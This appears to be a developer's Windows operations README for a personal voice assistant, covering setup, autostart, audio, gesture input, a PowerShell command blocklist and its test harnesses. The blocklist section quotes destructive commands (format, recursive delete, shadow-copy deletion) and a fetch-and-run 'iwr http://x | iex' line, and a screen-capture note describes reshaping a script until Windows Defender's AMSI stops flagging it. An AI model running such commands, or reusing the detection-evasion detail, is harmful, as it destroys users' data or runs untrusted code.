# Running him on Windows

This is the file to read when something breaks. It documents the machine he runs on, what has
to exist before he starts, and the failure modes that have actually happened — with the
measurement beside each one, so you can tell "this is the known problem" from "this is new".

**He runs where he is authored.** There is no deploy step. Until 2026-08-26 he lived on a
Raspberry Pi 5 and this file was 1,300 lines of tarballs, staged pip installs, `apt` packages,
udev rules and a boot race against a Wayland compositor. All of it is gone, and that is the
single largest thing the port bought: the repo you edit is the repo that runs.

---

## The box

| | |
|---|---|
| CPU | AMD Ryzen 7 5700X (8C/16T) |
| RAM | 32 GB |
| GPU | Radeon RX 6600, 8 GB — **unused**; everything runs on CPU |
| OS | Windows 11 Home 10.0.26200 |
| Python | **3.12.10** |
| Repo | `C:\Users\ironi\OneDrive\Desktop\EE_copilot_project\MR_ODD_BALL` |
| Branch | `oddball-integration` |

### Python 3.12, not 3.13, and it is one package's fault

`mediapipe` — the hand tracker behind `tools/gesture_pointer.py` and the thumbs-up approval in
`tools/gesture_control.py` — has no working wheel on 3.13. On the Pi this forced a **separate
3.12 sidecar venv** (`tools/install_gesture_venv.sh`, 400 MB) that the main process shelled out
to for one token per approval, because the Pi's main venv was 3.13.5 and moving 1.9 GB of
verified audio stack to chase one leaf feature was the wrong trade.

None of that applies here. This box is 3.12.10, so `mediapipe` and `opencv` import in the main
interpreter, the sidecar is deleted, and both are ordinary lines in `requirements.txt`. If you
ever upgrade this environment to 3.13, **the gesture features are what break**, and they break
at XNNPACK delegate creation rather than at import — so it will look like a crash, not a
missing dependency.

Check it in one line:

```powershell
python tools\gesture_pointer.py --check
```

```
  SendInput        present (user32)
  keyboard struct  absent - the pointer has no vocabulary for typing
  detector         tasks

  ready
```

---

## What has to exist before he starts

### 1. The venv

```powershell
python -m venv venv
venv\Scripts\pip install -r requirements.txt
```

One pass, no staging. The Pi needed the install split into hand-written groups so a pip
resolver backtrack stayed isolated to one group; with 32 GB it resolves in one go. The
hand-grouping is gone and so is `stage_install.sh`.

`PyQt6-WebEngine` is ~150 MB and is the largest single item. It is what renders his face — see
[The face](#the-face-pyqt6--qtwebengine).

### 2. The key

`.env`, gitignored, one line. Paste it without letting it reach your shell history — PSReadLine
keeps every command ever typed in plain text, which is why `tools/os_controller.py` refuses to
read that file and why it would be poor form to fill it:

```powershell
$k = Read-Host 'paste the key' -AsSecureString
[Runtime.InteropServices.Marshal]::PtrToStringAuto(
  [Runtime.InteropServices.Marshal]::SecureStringToBSTR($k)) |
  ForEach-Object { "GOOGLE_API_KEY=$_" } |
  Set-Content -Encoding utf8 .env
```

`engine/models.py` validates it at import and exits with this recipe if it is missing or
malformed. Every harness runs **without** a key, deliberately — see
[Verifying](#verifying-27-harnesses-no-key-no-hardware).

### 3. The model files

Gitignored, because they are large, and they do not arrive with a `git clone`:

| File | Size | Where from |
|---|---|---|
| `models/hey_mr_odd_ball.onnx` | ~1 MB | the trained wake word. Already present; back it up |
| `models/hand_landmarker.task` | 7.8 MB | `python tools\gesture_control.py --fetch-model` |
| `voices/en_US-joe-medium.onnx` | ~63 MB | `python -m piper.download_voices en_US-joe-medium --data-dir voices` |
| `models/whisper/` | ~75 MB | downloaded automatically on first STT use |

```powershell
Get-ChildItem models, voices -Recurse -File | Select-Object Name, @{n='MB';e={[math]::Round($_.Length/1MB,1)}}
```

---

## Starting him

```powershell
python main.py --text     # typing. No audio hardware, no HUD. Where agents get debugged.
python main.py            # voice: wake word, ears, voice, face
```

`--text` is not a lesser mode. It runs with no microphone, no speaker and no quota spent on
speech synthesis, and it still works when the audio stack does not.

### At logon

```powershell
powershell -ExecutionPolicy Bypass -File tools\install_autostart.ps1 install
powershell -ExecutionPolicy Bypass -File tools\install_autostart.ps1 status
powershell -ExecutionPolicy Bypass -File tools\install_autostart.ps1 remove
```

`install` puts a shortcut in `shell:startup` (`Win+R` → `shell:startup` to see it) pointing at
`wscript.exe config\start_oddball.vbs`.

Three files, and each exists for a reason:

| | |
|---|---|
| `config/start_oddball.bat` | starts `main.py --voice` and `hud/float.py`, logs to `data/oddball.log` |
| `config/start_oddball.vbs` | runs the `.bat` **with no console window** |
| `tools/install_autostart.ps1` | install / status / remove |

**Why the `.vbs` exists.** `pythonw.exe` in the batch file removes the console from the two
Python processes; it does nothing about the console `cmd.exe` gives the batch file itself. A
`.bat` alone in `shell:startup` leaves a black rectangle on the desktop all day, in front of
the transparent always-on-top face this whole thing exists to render cleanly.

**A shortcut, never a copy.** A copy goes stale the first time you `git pull`, and the failure
mode of a stale copy is that pulling appears to change nothing.

### What autostart does NOT do

**There is no restart-on-failure.** The Pi's systemd unit had `Restart=on-failure`,
`RestartSec=5` and gave up after 3 failures in 5 minutes. `shell:startup` has no equivalent: if
he falls over at 3am he stays down until the next logon.

Task Scheduler can do it and is the upgrade path. It is deliberately not used yet, because a
scheduled task is far harder to see, disable, or reason about than a shortcut in a folder you
can open — and an assistant you cannot easily turn off is worse than one that occasionally
needs turning on.

### Is he running?

```powershell
Get-CimInstance Win32_Process -Filter "Name='python.exe' OR Name='pythonw.exe'" |
  Where-Object CommandLine -match 'main\.py|float\.py' |
  Select-Object ProcessId, CommandLine
Get-Content data\oddball.log -Tail 20 -Encoding utf8
Get-Content dataace.log    -Tail 20 -Encoding utf8
```

**`-Encoding utf8` is required, not cosmetic.** The Python processes write UTF-8 — `main.py`
reconfigures stdout for it, because Ω, µ and ° are most of what this thing prints — and
`Get-Content` on PowerShell 5.1 defaults to the ANSI codepage. Without it an em-dash reads back
as `â€"` and the log looks corrupted when it is perfectly fine.

**Two logs, not one.** `oddball.log` is the assistant, `face.log` is the window. They are
separate because they interleave badly: the face logs a retry every few seconds while the
server is still loading models, which buries the assistant's startup output at exactly the
moment you are trying to read it.

To stop him: `Get-Process python, pythonw | Stop-Process`.

---

## The face: PyQt6 + QtWebEngine

```powershell
python hud\float.py --url "http://127.0.0.1:8765/?chat=1" `
    --transparent --undecorated --width 560 --height 900

# just the character, on the desktop, ignoring the mouse entirely
python hud\float.py --url "http://127.0.0.1:8765/?solo=1" `
    --transparent --undecorated --click-through --width 600 --height 600
```

He is `hud/face-preview.html` rendered in a native window. The page is served over HTTP by
`orchestrator/hud_bridge.py` on **port 8765**, the same port its WebSocket lives on.

### Why Qt and not pywebview

`--transparent` is load-bearing, not cosmetic. The solo look is the character composited onto
the desktop with **no rectangle seam**, and that needs the page transparent and the window
transparent *together*. pywebview drives WebView2, whose transparency is a
`DefaultBackgroundColor` that does not reliably reach a layered top-level window. Qt does it
directly — `WA_TranslucentBackground` on the window, `page().setBackgroundColor(transparent)`
on the view.

It is ~150 MB against WebView2's zero, and on this hardware that costs nothing. It is the first
place the new machine actually bought something the Pi could not have afforded.

### What replaced each labwc rule

| labwc / GTK4 | Qt6 / Win32 |
|---|---|
| `set_decorated(False)` | `Qt.FramelessWindowHint` |
| `<rule> keep-above` | `Qt.WindowStaysOnTopHint` → `WS_EX_TOPMOST` |
| `<rule> skipTaskbar` | `Qt.Tool` |
| `set_background_color(0,0,0,0)` | `WA_TranslucentBackground` + page background |
| `Gtk.EventControllerKey` (CAPTURE) | `QShortcut` with `WindowShortcut` context |

### `--click-through`, and why it is off by default

A frameless always-on-top window swallows every click inside its rectangle — including the
large fraction that is transparent nothing. `--click-through` sets
`WS_EX_LAYERED | WS_EX_TRANSPARENT` so those pixels pass clicks to the desktop underneath.

It is **off by default**, for the same reason the escape hatch exists: a window the mouse
passes through cannot be closed, moved or focused by mouse either. **Escape, Ctrl+Q and F11 are
then the only way out**, and they are bound before anything else in the window's construction.

It also makes `?chat=1` untypeable — there is a text box and a paperclip in there. Pair
click-through with `?solo=1`. `float.py` warns on stderr if you do not.

### The boot race, which did not go away

`hud/float.py::_keep_trying()` reloads the page forever with backoff (1 s, then ×1.6 up to 8 s).

It exists because of a real reboot on 2026-08-22: the service reported ready, the window
started, and **port 8765 was not bound until several seconds later** — it binds only after
faster-whisper and an onnxruntime wake model have loaded. The face's own JavaScript retries its
WebSocket forever, and that is not enough, because **the page itself is fetched over HTTP from
the same port**. When that GET fails there is no page, so there is no JavaScript, so nothing
retries anything.

`shell:startup` gives *less* ordering than systemd did — no `After=`, no `ExecStartPre`, no
`wait_for_display.sh`. This retry loop is now the only thing preventing that bug. **Do not
remove it, and do not replace it with a `timeout` in the batch file** — any fixed sleep is
either too short (error on screen) or too long (he is late for nothing).

Confirm it works by starting the face with no server running:

```powershell
python hud\float.py --seconds 6
# float: http://127.0.0.1:8765/ did not load - retrying in 1s
# float: http://127.0.0.1:8765/ did not load - retrying in 2s
```

---

## Audio

Everything is local: `sounddevice` (PortAudio) for capture and playback, Piper for the voice,
faster-whisper for the ears. Nothing leaves the machine.

```powershell
python audio\wake.py --list-devices
python audio\say.py --list-devices
python audio\say.py "forty seven ohms"
```

### The device name needs a host-API suffix, and this WILL bite you

`config/oddball.toml` has `[wake].device = "C270 HD WebCam), Windows WASAPI"`.

That trailing `), Windows WASAPI` is not noise. **PortAudio exposes one physical device once
per host API**, and Windows has four, so a bare `"C270"` matches all of them and `sounddevice`
refuses to guess:

```
Multiple input devices found for 'C270':
  [ 1] Microphone (Logi C270 HD WebCam, MME
  [ 7] Microphone (Logi C270 HD WebCam), Windows DirectSound
  [14] Microphone (Logi C270 HD WebCam), Windows WASAPI
  [17] Microphone (Logi C270 HD WebCam), Windows WDM-KS
```

On the Pi there was only ALSA, so one name meant one device. WDM-KS **cannot be opened for
blocking reads**, which is what `mic_frames()` does; `--list-devices` marks those.

### WASAPI needs `auto_convert`, or the stream will not open at all

> **This paragraph replaced a wrong one.** It previously claimed WASAPI was chosen because it
> opens the C270 at its native 48000 Hz, "an exact 3:1 decimation to the wake loop's 16000".
> That was reasoning, not measurement, and it was wrong twice: nothing in this repo decimates,
> and the stream would not have opened for it to try. Found by running
> `python audio\wake.py --meter` before LB did.

`SAMPLE_RATE_HZ` is 16000, because that is what openWakeWord's models take. **WASAPI is the
only Windows host API that refuses a rate the hardware does not natively support**, and the
error names nothing useful:

```
sounddevice.PortAudioError: Error opening InputStream:
    Invalid sample rate [PaErrorCode -9997]
```

MME and DirectSound are compatibility shims and resample silently, which is why they open at
16 kHz on any device and why this never surfaced until the wake device was pinned to WASAPI.

`audio/wake.py::_wasapi_settings()` passes `sd.WasapiSettings(auto_convert=True)` when — and
only when — the resolved device is on the WASAPI host API, turning on WASAPI's own sample-rate
conversion. So the honest accounting is that **WASAPI costs a resample too**, the same one MME
was doing invisibly. What it still buys is that it is not a shim, and that its converter is the
better of the two. That is a smaller advantage than the original note claimed, and it is
written down here rather than quietly corrected.

If you ever repoint `[wake].device` at an MME or DirectSound entry, this returns `None` and
nothing changes — it is a no-op everywhere it is not needed.

Prefer a name substring over an index. Indices renumber when Bluetooth devices reconnect.

### Pin the microphone, or Bluetooth will move it

`[wake].device` is pinned rather than left as `""` (system default) because of a measured
failure: on 2026-08-13 wake scores collapsed to 0.153 against a 0.30 threshold. The cause was
that connecting the Bose Flex 2 as a **speaker** silently moved the default **input** to its
HFP telephone-grade microphone.

The Bose is connected to this machine too, so the trap is live here. Bonus: nothing opening the
Bose's microphone also keeps it in A2DP rather than dropping to HFP, which is the difference
between music and telephone quality on the way *out* as well.

### The threshold is unfinished business

`[wake].threshold = 0.76`, and wake has been scoring **0.17–0.28** against it.

That number was fitted on the Pi. The C270 is the same microphone here — so the problem follows
the hardware, not the platform — but the room, the distance and the 48 kHz WASAPI path are all
different, and it has **not been re-measured since the move**. Do that before trusting it. It
is why the typed channel exists, and the typed channel is not a convenience feature.

### PowerShell mangles Ω, µ and ° unless told not to

Windows PowerShell 5.1 writes the **OEM console codepage**, so `Write-Output "47Ω 10µF 45°C"`
comes back as `47? 10?F 45?C` — every replacement character. For an EE copilot that is most of
the vocabulary.

`tools/os_controller.shell_argv()` prepends `[Console]::OutputEncoding=[Text.Encoding]::UTF8;`
to every command and decodes as UTF-8. Prepended rather than set with `chcp` so it cannot leak
into your own console.

---

## The OS route: PowerShell, and the blocklist under it

The `OS` route runs shell commands and opens applications. Both ask first.

### PowerShell, invoked as an argv

```python
["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", preamble + command]
```

Never `shell=True`. With a shell, `cmd.exe` would parse the command **before** PowerShell saw
it — `&`, `|`, `^` and `%` interpreted twice, by two parsers with different rules, one of which
the blocklist was not written against. An argv means the command reaches PowerShell exactly as
it was approved, which is what lets the card you read and the thing that runs be the same text.

Each flag earns its place:

- **`-NoProfile`** is a security flag before it is a speed one. A profile can define functions
  and aliases, and `Set-Alias Remove-Item Something-Else` in `$PROFILE` would make every
  pattern in the blocklist match a command that no longer does what it says. The blocklist
  matches *text*; the profile can change what that text *means*.
- **`-NonInteractive`** so a cmdlet that prompts (`Read-Host`, `Get-Credential`,
  `Remove-Item` on a non-empty directory) fails immediately instead of blocking until the
  15-second timeout. A prompt nobody can see is a hang.
- **No `-ExecutionPolicy Bypass`.** Deliberately absent. The blocklist refuses
  `Set-ExecutionPolicy Bypass` when the model writes it; a guard that blocks something and then
  does it itself on every call is not a guard.

`powershell.exe` (5.1) rather than `pwsh.exe` (7), even where 7 is installed: 5.1 ships with
Windows and is therefore always there. Preferring 7 would mean the shell — and so the syntax
the blocklist is written against — changing silently depending on the machine.

> **PowerShell 5.1 normalises every failure to exit code 1.** A cmdlet error, a `throw`, a
> parse error, an unknown command and a native exe's own non-zero code all arrive as 1
> (measured 2026-08-26). The exact code is lost; the ok/not-ok bit is not, and that is the only
> bit `Outcome` promises.

### The blocklist, and the time it was 94% useless

`tools/os_controller.FORBIDDEN` is 33 regex patterns applied to the normalised command **even
after you have approved it**. It is the weaker half of the pair and known to be: it stops a
model that has misunderstood the question writing something sweeping and plausible, and a tired
person saying yes to it. It does not stop a determined adversary and does not claim to.

**Every pattern in it was Linux syntax until 2026-08-26.** Pointed at a Windows shell, not one
of them could match anything that shell would run — and it does not fail loudly. It finds no
match, returns `None`, and answers **allowed**:

```
16 of 17 destructive Windows commands passed untouched, including
  format C: /y          del /s /q C:\          Remove-Item -Recurse -Force
  vssadmin delete shadows /all /quiet          iwr http://x | iex
```

The single refusal, `shutdown /s /t 0`, was luck — the word is spelled the same on both
systems. `tools/verify_os_guard.py` was green throughout, because it fed Linux strings to a
Linux table and both halves of that stayed true and stopped being relevant.

Measurement: `media/data/2026-08-26-windows-blocklist-gap.csv` (+ `.meta.json`).
Lesson: **L23** in `tasks/lessons.md`.

Now: 0 of 17 pass, and 0 of 28 ordinary commands are wrongly refused. The module **raises on
import off Windows**, so the state where it loads with an irrelevant table is unreachable
rather than merely tested against.

```powershell
python tools\os_controller.py           # table: windows (33 patterns), with a demo corpus
python tools\verify_os_guard.py         # 105 checks
python tools\verify_os_guard.py --probe # empty the list, confirm every refusal goes red
```

### Launching applications: the Start Menu is the catalogue

`tools/app_catalogue.py` reads the shortcut tree Windows already draws its own menu from:

```
%AppData%\Microsoft\Windows\Start Menu\Programs        (user — shadows the one below)
%ProgramData%\Microsoft\Windows\Start Menu\Programs    (machine)
```

**Nothing here is a hardcoded list of installed programs, and that is deliberate.** The Pi once
had a hand-written table of three rows and a sweep found one of the three already missing. The
Windows version of the same idea was specified during this port and measured against LB's own
three examples: **KiCad not installed, Firefox not installed, VS Code at
`AppData\Local\Programs\...` rather than `C:\Program Files`.** One in three — the same score.
And a hardcoded `\8.0\` in a path goes stale on the next update.

```powershell
python tools\app_catalogue.py                    # everything he can open, with roles
python tools\app_catalogue.py "the browser" "vscode" "the schematic editor"
python tools\app_launcher.py --display           # can he see a screen at all
```

**`argv[0]` is the `.lnk`, never the `.exe` it points at.** A shortcut carries arguments, a
working directory, a run-as-administrator flag, and for a Store app an AppUserModelID rather
than a path at all. `os.startfile` on the shortcut makes Windows resolve all of it, exactly as
double-clicking would. It also means the launched process is a child of **Explorer**, not of
the assistant — so it survives a restart, holds none of our handles, and needs no PID tracking.
That single call replaced ~120 lines of `systemd-run` argv construction.

#### Roles: what the Start Menu could not tell us

On the Pi, "the browser" and "the schematic editor" worked because every `.desktop` file
carries a `Categories=` key that genuinely says what a program *is*. **Windows records no such
thing** — Start Menu folders are named after *vendors* ("Autodesk", "Git", "NVIDIA"), and not
one of the 70 shortcuts on this machine sits in a folder naming a role.

Two things fill the gap:

- **`_default_browser_target()`** reads the registry's own default-browser association
  (`Shell\Associations\UrlAssociations\http\UserChoice`). This is *better* than the Pi managed:
  there, two browsers were installed and he had to ask which; here the OS records a preference,
  so "open the browser" opens the one you actually use.
- **`PROGRAM_ROLES`** maps an executable stem to role tokens — `kicad` → `EDA`, `eeschema` →
  `SchematicEditor`, `Code` → `TextEditor, IDE`, `openscad` → `CAD`.

`PROGRAM_ROLES` is a curated table in a module that refuses curated tables, and the distinction
matters: **it says what KIND a program is, never which programs exist.** "the schematic editor"
with KiCad uninstalled resolves to nothing, exactly as "eeschema" does. It is keyed on the
**executable**, not the display name, because a Start Menu name carries a version ("KiCad 8.0",
"Creality Print 7.2") and `kicad.exe` does not.

A tool not in the table still resolves by name and still launches — it is only unreachable by
role. That graceful degradation is why the table can stay short.

Ambiguity is **never** guessed. Four slicers means "the slicer" reports four candidates and he
asks.

---

## Gestures: `SendInput`, and the guarantee that did not survive

`tools/gesture_pointer.py` drives the desktop pointer from a pinch. Motion and dragging only.
Read its header before changing anything in it — it makes four security guarantees, and
**one of them is weaker on Windows than it was on the Pi.**

| Guarantee | Pi | Windows |
|---|---|---|
| 2 — press and release never co-located (`CLICK_GUARD_PX = 160`) | logic | **unchanged** |
| 3 — only the left button exists | device capability | emission chokepoint |
| 4 — inert while an approval is on screen (`PAUSE_FILE`) | logic | **unchanged** |
| 1 — **cannot type** | kernel-enforced | **inspection only** |

Guarantee 1 stops the pointer answering the `input()` prompt that approves a shell command. On
the Pi, `evdev.UInput` declared no keyboard capability, so **no bug in that file could type a
`y`** — the guarantee did not depend on the code being correct.

Windows has no user-mode equivalent. `SendInput` is one call that takes mouse *or* keyboard
structures. `tools/win_input.py` therefore declares **only `MOUSEINPUT`, never `KEYBDINPUT`** —
typing is not something that process can do wrong, it is something it has no vocabulary for.
That is the smallest surface the guarantee reduces to here, and it is still a downgrade: on the
Pi a *bug* could not type; on Windows an *edit* could.

`pyautogui` and `pynput` were both considered and refused for this reason. Either one puts
move, click, right-click and type behind a single import, and the guarantee becomes "we were
careful about which functions we called" — a code review, re-run on every future edit.

```powershell
python tools\win_input.py --check       # prints the INPUT union's members: one is the proof
python tools\gesture_pointer.py --check
python tools\gesture_pointer.py --dry-run
python tools\verify_pointer.py          # 17 checks; sections 2-4 run the real guard code
python tools\verify_pointer.py --probe
```

**`POINTER_GAIN = 900` is still the libinput figure and needs re-fitting.**
`MOUSEEVENTF_MOVE` without `MOUSEEVENTF_ABSOLUTE` is a relative delta in mickeys, and Windows
applies its own acceleration curve to it — non-linearly, so fast hand movement is amplified
more than slow. `--dry-run` prints the deltas asked for, not the pixels the cursor moved.

---

## Looking at the screen

`tools/screen_capture.py` takes one frame, downscales it, and sends it to Gemini.

The backend is PowerShell's `System.Drawing` capture and needs nothing installed. `grim`,
`scrot`, ImageMagick and `gnome-screenshot` were deleted with the rest of the Linux code.

> **Windows Defender blocks the obvious version of this script**, and not for the reason the
> internet gives. The received wisdom is that an inline `powershell -Command` is blocked where
> a `.ps1` run with `-File` is not — that was **not sufficient here**. Bisecting found the
> actual AMSI trigger was the **JPEG-quality encoder block** (`ImageCodecInfo::GetImageEncoders`
> plus `EncoderParameter`), not `CopyFromScreen`, which is the call everybody assumes. With the
> encoder block removed and .NET's default JPEG quality accepted, the identical script runs.
> The failure presents as a PowerShell *ParserError*, which reads exactly like a syntax bug and
> sends you rewriting working code.
> Written up in `media/data/2026-08-25-screen-capture-amsi.meta.json`.

```powershell
python tools\verify_screen.py --capture     # takes a real frame; open it and look at it
```

Frames land in `data/screen/` (gitignored). `ODDBALL_SCREEN_CONFIRM=0` makes it instant;
`ODDBALL_SCREEN=0` turns the route off.

---

## Ports

| Port | What | Where |
|---|---|---|
| 8765 | the face — HTTP for the page, WebSocket for state, same port | `orchestrator/hud_bridge.py` |
| 8766 | `tools/face_stage.py`, a pinned rig for measurement. Deliberately different so it can run beside the live one | |
| 8767 | `POST /upload`, the paperclip | `engine/server.py` |

All bind to `127.0.0.1`. Nothing listens on an external interface.

---

## Verifying: 27 harnesses, no key, no hardware

```powershell
Get-ChildItem tools\verify_*.py | ForEach-Object { python $_.FullName }
```

~12,300 checks. **Every one runs without an API key**, because for most of the project's life
the box they were written on had none. Several take `--probe`, which deliberately breaks the
thing being tested and confirms the harness goes red — a check that cannot fail is not a check.

The ones worth knowing by name:

| | |
|---|---|
| `verify_os_guard.py` | the blocklist. `--probe` empties it |
| `verify_pointer.py` | the four gesture guarantees. `--probe` weakens each |
| `verify_launch.py` | the catalogue, resolution, roles, and every refusal path. `--probe` runs six mutations |
| `verify_screen.py` | `--capture` takes a real frame |
| `verify_agents.py` | that every third-party import is declared in `requirements.txt` |

### Two harness lessons that cost real time

**A table selected at import makes every harness a test of the wrong platform.** This is the
blocklist story above, generalised, and it is **L23**. Wherever a module picks a table, backend
or pattern list at import, assert first that the *running* platform got one and that it is not
empty. `verify_os_guard.py` section 0 does exactly that, in three dull lines.

**In this repo, textual checks read the prose.** The comments outnumber the statements, and
three separate checks were defeated by documentation: `source.split('"""')[-1]` takes only the
file tail; a grep for `shell=True` matched seven comments explaining why it is *not* used; a
regex for imports reported `a` and `his` as undeclared dependencies, from sentences like
"import a second copy". **Use `ast`, not text, for any check about what the code does.**

---

## Where things live

| | |
|---|---|
| `data/oddball.log` | the assistant's stdout and stderr, appended per start |
| `data/face.log` | the window's — including every page-load retry |
| `data/screen/` | screenshot frames, rotated |
| `data/inbox/` | uploads land here before filing |
| `vault/` | notes, corrections, reflections — gitignored |
| `sd_card_memory.json` | the last 40 messages |
| `chroma_db/` | the vector store, if the RAG extra is installed |
| `models/`, `voices/` | gitignored, see [The model files](#3-the-model-files) |

`ODDBALL_VAULT_DIR` redirects the vault, and every harness that can reach a write sets it to a
temp directory. That override exists because two harnesses were silently appending to the real
correction ledger — where it would then be injected into every agent prompt as things that had
"gone wrong". Both were green throughout; the only thing that found it was listing the ledger
after a sweep. **L22.**

---

## Still open

- [ ] **Nothing has run end to end** at the time of writing — `main.py` stops at the key check.
- [ ] **Re-fit `[wake].threshold`.** Still the Pi's 0.76 against scores of 0.17–0.28.
- [ ] **Re-fit `POINTER_GAIN`.** Still the libinput 900.
- [ ] **No restart-on-failure.** See [What autostart does NOT do](#what-autostart-does-not-do).
- [ ] **14 of the 41 applications he can open carry no readable target** (38 of the 70
      raw shortcuts, before exclusions), so the "is it installed" check is
      skipped for them. They launch correctly, and the card says the check was skipped rather
      than implying it passed. Refusing them would break every Control Panel entry.
- [ ] `tools/measure_face.py` and `tools/live_test_gestures.py` still carry labwc handling.
      Both are measurement tools off the turn path; `measure_face.py` will report zeros here.
